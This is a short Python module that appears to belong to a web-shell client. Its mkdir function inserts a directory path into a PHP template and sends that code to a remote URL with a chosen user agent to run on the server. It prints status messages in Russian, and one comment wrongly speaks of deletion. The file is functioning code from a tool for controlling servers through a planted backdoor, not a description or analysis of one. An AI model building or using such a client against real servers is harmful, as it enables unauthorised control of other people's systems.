import modules.send as send

def mkdir(url,pwd,com,uagent):
    with open('modules\\md\\md.php') as f:data = f.read()

    if "/" in com: #Проверка на абсолютный путь удяляемого
        data = data.replace("$cat = $_LOCAL;", f"$cat = \"{com}\";")
        X = send.send(url,data,uagent)
        if X == "X2":
            print("Папка уже существует")
        if X == "X1":
            print("Папка не создана")
        if X == "X":
            print("Невозможно создать папку")

    else:
        data = data.replace("$cat = $_LOCAL;", f"$cat = \"{pwd+'/'+com}\";")
        X = send.send(url,data,uagent)
        if X == "X2":
            print("Папка уже существует")
        if X == "X1":
            print("Папка не создана")
        if X == "X":
            print("Невозможно создать папку")